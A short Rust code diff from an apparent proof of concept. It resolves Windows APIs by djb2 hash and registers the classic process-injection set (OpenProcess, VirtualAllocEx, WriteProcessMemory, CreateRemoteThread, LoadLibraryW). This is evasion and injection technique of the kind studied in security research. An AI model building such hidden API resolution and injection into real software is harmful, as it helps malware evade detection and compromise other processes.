@@ -6,11 +6,12 @@ mod util;
 cfg_if::cfg_if! {
     if #[cfg(debug_assertions)] {
         use std::ffi::c_void;
-        use djb2macro::djb2;
-        use hash_resolver::*;
         use crate::util::*;
     }
 }
+
+use djb2macro::djb2;
+use hash_resolver::*;
 
 // HWND -> HANDLE -> void *
 // LPCWSTR -> *const u16
@@ -57,6 +58,17 @@ fn perform_poc() -> i32 {
             return 3;
         }
     };
+
+    // Set target APIs
+    set_initial_target_apis(&[
+        djb2!("OpenProcess"),
+        djb2!("VirtualAllocEx"),
+        djb2!("LoadLibraryW"),
+        djb2!("WriteProcessMemory"),
+        djb2!("CreateRemoteThread"),
+        djb2!("MessageBoxW"),
+        djb2!("CloseHandle"),
+    ]).unwrap();
 
     #[cfg(debug_assertions)] {
         println!("Printing target hashes:");
